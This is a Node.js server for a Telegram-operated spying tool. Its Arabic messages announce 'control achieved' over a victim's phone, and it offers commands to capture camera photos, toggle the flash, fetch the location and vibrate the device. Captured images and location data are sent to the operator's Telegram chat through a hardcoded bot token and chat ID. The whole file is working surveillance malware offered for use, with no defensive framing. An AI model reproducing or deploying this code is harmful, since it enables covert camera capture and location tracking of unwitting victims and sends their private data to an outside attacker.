const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);

const token = '8766880203:AAHf1s3J_uKpUXdjZjtY3QcsjHXky3xFrxE';
const chatId = '7099906183';
const bot = new TelegramBot(token, { polling: true });

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

io.on('connection', (socket) => {
    socket.on('ready', () => {
        bot.sendMessage(chatId, "🎯 تم السيطرة بنجاح!\n\nالأوامر المتاحة:\n/cam - تصوير\n/on - تشغيل الفلاش\n/off - إطفاء الفلاش\n/loc - تحديد الموقع\n/vib - هز الجوال");
    });
    bot.on('message', (msg) => {
        if (msg.text === '/cam') socket.emit('exec', { act: 'photo' });
        if (msg.text === '/on') socket.emit('exec', { act: 'flash', val: true });
        if (msg.text === '/off') socket.emit('exec', { act: 'flash', val: false });
        if (msg.text === '/loc') socket.emit('exec', { act: 'loc' });
        if (msg.text === '/vib') socket.emit('exec', { act: 'vib' });
    });
    socket.on('res', (data) => {
        if (data.type === 'img') {
            const buff = Buffer.from(data.file.split(',')[1], 'base64');
            bot.sendPhoto(chatId, buff, {caption: "📸 صيد حي من الكاميرا"});
        } else { bot.sendMessage(chatId, data.val); }
    });
});
http.listen(process.env.PORT || 3000);
